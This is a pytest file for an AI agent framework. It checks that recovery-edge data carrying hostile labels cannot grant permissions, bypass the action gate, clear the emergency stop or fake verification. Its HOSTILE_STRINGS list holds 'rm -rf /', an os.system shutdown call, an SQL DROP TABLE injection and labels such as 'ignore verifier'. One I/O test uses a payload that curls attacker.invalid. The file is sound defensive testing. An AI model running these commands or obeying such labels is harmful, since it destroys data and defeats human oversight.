"""Adversarial authority tests for the canonical A3.07 recovery edge contract.

Hostile recovery/error control-flow data must stay inert. Everything here
asserts that maximally hostile recovery routes — including labels and node
ids that claim authority, verification, success, retries, or deactivation of
safeguards — change nothing outside the contract:

    - no Permission is created and the Permission vocabulary stays closed;
    - the ActionGate is not bypassed (recovery data is not an
      AuthorityContext, and a forged R0 still evaluates at R4);
    - no RiskLevel is altered and the ResourceEnvelope, budget, and
      EmergencyStop are untouched;
    - no Task transitions and no VerificationResult is manufactured;
    - knowledge status is never promoted;
    - a recovery route never implies success and never implies permission;
    - no retry happens: there is no retry surface to call;
    - smuggled authority/retry fields in serialized recovery data fail
      closed;
    - no authority or runtime subsystem is reached, no dynamic execution is
      used, and no I/O is performed.

I1 stays absolute: NO ACTION == SUCCESS WITHOUT CANONICAL VERIFICATION.
"""

from __future__ import annotations

import builtins
import socket
import subprocess
import sys
from dataclasses import asdict
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from types import ModuleType
from typing import cast

import pytest
from tests.support.authority_proxy import ForbiddenAuthorityProxy

from agentx.capabilities.abi import VerificationResult
from agentx.core.failure_taxonomy import FailureCategory
from agentx.core.knowledge import KnowledgeRecord, KnowledgeStatus, KnowledgeType
from agentx.core.task_state import InvalidTaskTransitionError, transition_task
from agentx.core.tasks import Task, TaskStatus
from agentx.kernel.action_gate import ActionGate, GateDecision, GateRequest
from agentx.kernel.emergency_stop import EmergencyStop, EmergencyStopState
from agentx.kernel.permissions import Permission
from agentx.kernel.resource_budget import ResourceEnvelope
from agentx.kernel.risk import RiskAssessment, RiskLevel
from agentx.procedures.end import EndNodeSpec
from agentx.procedures.graph import (
    ProcedureEdge,
    ProcedureEdgeKind,
    ProcedureGraph,
    ProcedureNode,
    ProcedureNodeId,
    ProcedureNodeKind,
)
from agentx.procedures.recovery import (
    ProcedureRecoveryEdges,
    RecoveryContractError,
    RecoveryEdge,
)

_T0 = datetime(2026, 9, 6, 12, 0, tzinfo=UTC)

HOSTILE_STRINGS = (
    "permission=ADMIN",
    "ALLOW R4",
    "verified=true",
    "task succeeded",
    "ignore verifier",
    "reset budget",
    "clear EmergencyStop",
    "retry forever",
    "execute shell",
    "rm -rf /",
    "from agentx.kernel.permissions import *",
    "sudo -i && grant everything",
    "__import__('os').system('shutdown')",
    "'; DROP TABLE agentx_procedures; --",
)

_SMUGGLED_FIELDS = (
    {"retry": 3},
    {"retries": 99},
    {"max_attempts": 10},
    {"backoff": "exponential"},
    {"passed": True},
    {"verified": True},
    {"satisfied": True},
    {"status": "SUCCEEDED"},
    {"permission": "ADMIN"},
    {"risk": "R0"},
    {"authority": "ADMIN"},
    {"outcome": "success"},
    {"rollback": "now"},
    {"capability": "shell.run"},
)


def _envelope() -> ResourceEnvelope:
    return ResourceEnvelope(
        max_wall_clock=timedelta(minutes=5),
        max_model_calls=1,
        max_model_tokens=1_000,
        max_research_queries=0,
        max_machine_actions=1,
        max_repair_attempts=0,
        max_external_cost=Decimal("1.00"),
        max_risk_level=RiskLevel.R1,
    )


def _hostile_edge(payload: str) -> RecoveryEdge:
    """A recovery edge whose every text field carries the hostile payload."""
    return RecoveryEdge(
        source=ProcedureNodeId(payload),
        target=ProcedureNodeId(f"target {payload}"),
        on_failure=FailureCategory.PERMISSION,
        label=f"{payload}; task succeeded; verified=true; retry forever",
    )


def _hostile_document(payload: str) -> ProcedureRecoveryEdges:
    return ProcedureRecoveryEdges(recovery_edges=(_hostile_edge(payload),))


def _hostile_graph(payload: str) -> ProcedureGraph:
    """A graph that carries the hostile route as a canonical RECOVERY edge."""
    source = ProcedureNodeId(payload)
    target = ProcedureNodeId(f"target {payload}")
    return ProcedureGraph(
        entry=source,
        nodes=(
            ProcedureNode(id=source, kind=ProcedureNodeKind.ACTION, label=payload),
            EndNodeSpec().to_node(target, label=payload),
        ),
        edges=(ProcedureEdge(source=source, target=target, kind=ProcedureEdgeKind.RECOVERY),),
    )


# ---------------------------------------------------------------------------
# Hostile strings remain inert data
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_hostile_recovery_metadata_is_carried_verbatim_as_inert_data(payload: str) -> None:
    edge = _hostile_edge(payload)
    restored = RecoveryEdge.from_dict(edge.to_dict())

    assert restored == edge
    assert restored.label is not None
    assert restored.label.startswith(payload)
    assert restored.source.to_str() == payload
    # The serialized form is JSON text containing the payload verbatim — never
    # an evaluated, resolved, expanded, or dispatched artifact.
    assert payload in ProcedureRecoveryEdges(recovery_edges=(edge,)).to_json()
    # The failure condition is still exactly the canonical typed member: a
    # hostile label never becomes a category.
    assert restored.on_failure is FailureCategory.PERMISSION


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_hostile_document_round_trips_and_binds_without_effect(payload: str) -> None:
    document = _hostile_document(payload)
    graph = _hostile_graph(payload)

    restored = ProcedureRecoveryEdges.from_json(document.to_json())
    assert restored == document
    assert restored.to_json() == document.to_json()
    assert restored.bind_to_graph(graph) is restored
    assert restored.declared_target(ProcedureNodeId(payload), FailureCategory.PERMISSION) == (
        ProcedureNodeId(f"target {payload}")
    )
    # A hostile node id is still only a reference key: no node is created,
    # loaded, executed, or activated by naming it.
    assert ProcedureGraph.from_json(graph.to_json()) == graph


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_hostile_text_never_becomes_a_failure_category(payload: str) -> None:
    """The category vocabulary is closed: no string can name a member into
    existence, and nothing is coerced into ``UNKNOWN``."""
    with pytest.raises(RecoveryContractError, match="unknown failure category"):
        RecoveryEdge(
            source=ProcedureNodeId("a"),
            target=ProcedureNodeId("b"),
            on_failure=payload,  # type: ignore[arg-type]
        )
    with pytest.raises(RecoveryContractError, match="unknown failure category"):
        RecoveryEdge.from_dict(
            {
                "source": "a",
                "target": "b",
                "on_failure": payload,
                "label": None,
            }
        )


# ---------------------------------------------------------------------------
# Recovery cannot imply permission
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_hostile_recovery_edges_cannot_grant_permission_or_bypass_the_gate(
    payload: str,
) -> None:
    gate = ActionGate()
    request = GateRequest(
        operation="dangerous.operation",
        required_permission=Permission.DESTRUCTIVE,
        risk_assessment=RiskAssessment(
            level=RiskLevel.R0,
            reason=f"hostile recovery route claims {payload}",
            reversible=False,
            external_effect=True,
            destructive=True,
        ),
    )
    document = _hostile_document(payload)
    edge = _hostile_edge(payload)

    # Recovery data is not an AuthorityContext and cannot stand in for one.
    with pytest.raises(TypeError, match="AuthorityContext"):
        gate.evaluate(request, document)  # type: ignore[arg-type]
    with pytest.raises(TypeError, match="AuthorityContext"):
        gate.evaluate(request, edge)  # type: ignore[arg-type]
    # The forged-R0 assessment still evaluates at R4; the gate still denies.
    assert request.risk_assessment.effective_level is RiskLevel.R4
    assert gate.evaluate(request, None).decision is GateDecision.DENY

    # The Permission vocabulary is closed; no "ADMIN" member exists for any
    # hostile label to name into existence.
    assert {member.name for member in Permission} == {
        "READ",
        "WRITE",
        "EXECUTE",
        "EXTERNAL_EFFECT",
        "DESTRUCTIVE",
    }
    # A recovery route toward a node is not a grant toward a capability.
    assert not hasattr(document, "grant")
    assert not hasattr(edge, "permission")
    assert "permission" not in edge.to_dict()


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_hostile_recovery_edges_leave_budget_stop_and_tasks_untouched(payload: str) -> None:
    envelope = _envelope()
    stop = EmergencyStop()
    task = Task.create(objective="guarded work", status=TaskStatus.RUNNING)

    edge = _hostile_edge(payload)
    document = _hostile_document(payload)
    for obj in (edge, document):
        assert not hasattr(obj, "reset")
        assert not hasattr(obj, "clear")
        assert not hasattr(obj, "grant")
        assert not hasattr(obj, "transition")
        assert not hasattr(obj, "promote")
        assert not hasattr(obj, "execute")
        assert not hasattr(obj, "retry")
        assert not hasattr(obj, "rollback")
        assert not callable(obj)
        obj.to_dict()  # rendering is pure data work

    document.to_json()  # serializing is pure data work

    document.bind_to_graph(_hostile_graph(payload))
    ProcedureRecoveryEdges.from_json(document.to_json())

    assert stop.state is EmergencyStopState.RUNNING
    assert not stop.stop_requested
    assert envelope == _envelope()  # frozen kernel-side bounds are untouched
    assert task.status is TaskStatus.RUNNING
    # Only an explicit call through the canonical state machine can move a
    # task; a hostile recovery label saying "task succeeded" moved nothing.
    moved = transition_task(task, TaskStatus.SUCCEEDED)
    assert moved.status is TaskStatus.SUCCEEDED
    with pytest.raises(InvalidTaskTransitionError):
        transition_task(moved, TaskStatus.RUNNING)


# ---------------------------------------------------------------------------
# Recovery cannot imply success or verification
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_no_recovery_route_fabricates_verification_or_verified_knowledge(payload: str) -> None:
    record = KnowledgeRecord.create(
        knowledge_type=KnowledgeType.FACT,
        content="untrusted external claim",
        created_at=_T0,
    )
    assert record.status is KnowledgeStatus.UNVERIFIED

    for payload_dict in (_hostile_edge(payload).to_dict(), _hostile_document(payload).to_dict()):
        # No verdict/outcome field exists by construction...
        for forbidden in ("passed", "verdict", "verified", "satisfied", "status", "outcome"):
            assert forbidden not in payload_dict
        # ...and the dict cannot masquerade as a VerificationResult.
        with pytest.raises(TypeError):
            VerificationResult(**payload_dict)  # type: ignore[arg-type]

    assert record.status is KnowledgeStatus.UNVERIFIED  # no promotion happened
    with pytest.raises(TypeError):
        VerificationResult(passed=payload, detail=payload)  # type: ignore[arg-type]


def test_reaching_a_recovery_target_is_not_success() -> None:
    """A declared recovery route is a transition, never an outcome: the graph,
    the document, and the task all stay exactly what they were."""
    source = ProcedureNodeId("risky_step")
    target = ProcedureNodeId("safe_harbour")
    document = ProcedureRecoveryEdges(
        recovery_edges=(
            RecoveryEdge(
                source=source,
                target=target,
                on_failure=FailureCategory.CAPABILITY,
                label="the task succeeded; verified=true",
            ),
        )
    )
    graph = ProcedureGraph(
        entry=source,
        nodes=(
            ProcedureNode(id=source, kind=ProcedureNodeKind.ACTION),
            EndNodeSpec().to_node(target, label="reaching here means success"),
        ),
        edges=(ProcedureEdge(source=source, target=target, kind=ProcedureEdgeKind.RECOVERY),),
    )
    task = Task.create(objective="risky work", status=TaskStatus.RUNNING)

    assert document.bind_to_graph(graph) is document
    assert document.declared_target(source, FailureCategory.CAPABILITY) == target
    ProcedureRecoveryEdges.from_json(document.to_json())
    ProcedureGraph.from_json(graph.to_json())

    assert task.status is TaskStatus.RUNNING
    assert "passed" not in document.to_dict()
    assert "passed" not in graph.to_dict()
    for forbidden in ("passed", "verified", "verdict", "succeeded", "mark_succeeded", "succeed"):
        assert not hasattr(document, forbidden), forbidden
        assert not hasattr(document.recovery_edges[0], forbidden), forbidden


def test_recovery_document_is_not_a_verification_result() -> None:
    document = _hostile_document("verified=true")
    assert type(document) is ProcedureRecoveryEdges
    with pytest.raises(TypeError):
        VerificationResult(**asdict(document.recovery_edges[0]))


# ---------------------------------------------------------------------------
# No retry, no rollback, no execution of any kind
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("smuggled", _SMUGGLED_FIELDS)
def test_smuggled_authority_and_retry_fields_fail_closed(smuggled: dict[str, object]) -> None:
    base = _hostile_edge("permission=ADMIN").to_dict()
    with pytest.raises(RecoveryContractError, match="unknown fields"):
        RecoveryEdge.from_dict({**base, **smuggled})

    document_base = _hostile_document("retry forever").to_dict()
    with pytest.raises(RecoveryContractError, match="unknown fields"):
        ProcedureRecoveryEdges.from_dict({**document_base, **smuggled})


def test_declaring_a_route_performs_no_retry_and_repeated_use_is_idempotent() -> None:
    """There is no retry surface to call, and using the document repeatedly
    changes nothing: representation is not execution."""
    source = ProcedureNodeId("flaky")
    target = ProcedureNodeId("fallback")
    document = ProcedureRecoveryEdges(
        recovery_edges=(
            RecoveryEdge(source=source, target=target, on_failure=FailureCategory.TRANSIENT),
        )
    )
    graph = ProcedureGraph(
        entry=source,
        nodes=(
            ProcedureNode(id=source, kind=ProcedureNodeKind.ACTION),
            ProcedureNode(id=target, kind=ProcedureNodeKind.ACTION),
        ),
        edges=(ProcedureEdge(source=source, target=target, kind=ProcedureEdgeKind.RECOVERY),),
    )
    text = document.to_json()

    for _ in range(5):
        assert document.bind_to_graph(graph) is document
        assert document.declared_target(source, FailureCategory.TRANSIENT) == target
        assert document.to_json() == text
        assert ProcedureRecoveryEdges.from_json(text) == document

    assert document.to_graph_edges() == (
        ProcedureEdge(source=source, target=target, kind=ProcedureEdgeKind.RECOVERY),
    )


def test_recovery_route_toward_a_rollback_node_is_not_a_rollback() -> None:
    """Naming a rollback node as a target describes control flow; nothing is
    rolled back, restored, reverted, or undone by this contract."""
    source = ProcedureNodeId("step")
    target = ProcedureNodeId("undo_step")
    document = ProcedureRecoveryEdges(
        recovery_edges=(
            RecoveryEdge(
                source=source,
                target=target,
                on_failure=FailureCategory.ENVIRONMENT,
                label="roll back everything now",
            ),
        )
    )
    graph = ProcedureGraph(
        entry=source,
        nodes=(
            ProcedureNode(id=source, kind=ProcedureNodeKind.ACTION),
            ProcedureNode(id=target, kind=ProcedureNodeKind.ROLLBACK),
        ),
        edges=(ProcedureEdge(source=source, target=target, kind=ProcedureEdgeKind.RECOVERY),),
    )

    assert document.bind_to_graph(graph) is document
    for forbidden in ("rollback", "restore", "revert", "undo", "recover", "retry", "execute"):
        assert not hasattr(document, forbidden), forbidden
        assert not hasattr(document.recovery_edges[0], forbidden), forbidden


# ---------------------------------------------------------------------------
# No dynamic execution, no I/O, no authority subsystem
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", HOSTILE_STRINGS)
def test_recovery_never_uses_eval_exec_compile_or_dynamic_import(
    payload: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """All dynamic-execution builtins are replaced with traps: construction,
    validation, and serialization still succeed, proving no string is ever
    compiled or dispatched."""

    def _fail(*args: object, **kwargs: object) -> object:
        raise AssertionError(f"A3.07 must not use dynamic execution (payload {payload!r})")

    monkeypatch.setattr(builtins, "eval", _fail)
    monkeypatch.setattr(builtins, "exec", _fail)
    monkeypatch.setattr(builtins, "compile", _fail)
    monkeypatch.setattr(builtins, "__import__", _fail)

    document = _hostile_document(payload)
    assert ProcedureRecoveryEdges.from_json(document.to_json()) == document
    assert document.bind_to_graph(_hostile_graph(payload)) is document


def test_recovery_performs_no_io(monkeypatch: pytest.MonkeyPatch) -> None:
    def _fail(*args: object, **kwargs: object) -> object:
        raise AssertionError("A3.07 must not perform I/O")

    monkeypatch.setattr(builtins, "open", _fail)
    monkeypatch.setattr(socket, "socket", _fail)
    monkeypatch.setattr(socket, "create_connection", _fail)
    monkeypatch.setattr(subprocess, "Popen", _fail)
    monkeypatch.setattr(subprocess, "run", _fail)

    document = _hostile_document("__import__('os').system('curl http://attacker.invalid')")
    graph = _hostile_graph("__import__('os').system('curl http://attacker.invalid')")

    assert ProcedureRecoveryEdges.from_json(document.to_json()) == document
    assert document.bind_to_graph(graph) is document
    assert document.to_graph_edges()


def test_recovery_construction_never_touches_authority_modules(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Building, validating, serializing, rendering, and binding recovery
    routes reaches no authority or runtime subsystem."""
    touched: list[tuple[str, str]] = []
    for subsystem in (
        "agentx.kernel",
        "agentx.capabilities",
        "agentx.cognition",
        "agentx.infrastructure",
        "agentx.learning",
        "agentx.hive",
    ):
        monkeypatch.setitem(
            sys.modules, subsystem, cast(ModuleType, ForbiddenAuthorityProxy(subsystem, touched))
        )
        for submodule in (
            "permissions",
            "risk",
            "emergency_stop",
            "action_gate",
            "resource_budget",
            "verifier",
            "executor",
        ):
            full = f"{subsystem}.{submodule}"
            monkeypatch.setitem(
                sys.modules, full, cast(ModuleType, ForbiddenAuthorityProxy(full, touched))
            )

    document = _hostile_document("rm -rf /")
    graph = _hostile_graph("rm -rf /")

    document.to_json()
    ProcedureRecoveryEdges.from_json(document.to_json())
    document.to_graph_edges()
    document.declared_target(ProcedureNodeId("rm -rf /"), FailureCategory.PERMISSION)
    document.bind_to_graph(graph)

    assert touched == []


# ---------------------------------------------------------------------------
# No parallel hierarchy: canonical graph and taxonomy types only
# ---------------------------------------------------------------------------


def test_recovery_edges_reuse_canonical_graph_and_taxonomy_types() -> None:
    """The contract composes canonical identity, edge, and failure types; no
    parallel node/edge/category hierarchy exists beside A3.01 and C4.01."""
    document = _hostile_document("permission=ADMIN")
    edge = document.recovery_edges[0]

    assert type(edge.source) is ProcedureNodeId
    assert type(edge.target) is ProcedureNodeId
    assert type(edge.on_failure) is FailureCategory
    assert all(type(rendered) is ProcedureEdge for rendered in document.to_graph_edges())
    assert all(
        rendered.kind is ProcedureEdgeKind.RECOVERY for rendered in document.to_graph_edges()
    )


def test_a_normal_progression_edge_is_not_a_recovery_route() -> None:
    """The two edge kinds stay distinct: a NEXT edge never satisfies a
    recovery declaration and a recovery route never becomes progression."""
    source = ProcedureNodeId("a")
    target = ProcedureNodeId("b")
    document = ProcedureRecoveryEdges(
        recovery_edges=(
            RecoveryEdge(source=source, target=target, on_failure=FailureCategory.PLAN),
        )
    )
    graph = ProcedureGraph(
        entry=source,
        nodes=(
            ProcedureNode(id=source, kind=ProcedureNodeKind.ACTION),
            ProcedureNode(id=target, kind=ProcedureNodeKind.ACTION),
        ),
        edges=(ProcedureEdge(source=source, target=target, kind=ProcedureEdgeKind.NEXT),),
    )

    with pytest.raises(RecoveryContractError, match="not present in the graph as a RECOVERY"):
        document.bind_to_graph(graph)
    assert len({ProcedureEdgeKind.NEXT, ProcedureEdgeKind.RECOVERY}) == 2
    assert document.declared_target(source, FailureCategory.PLAN) == target
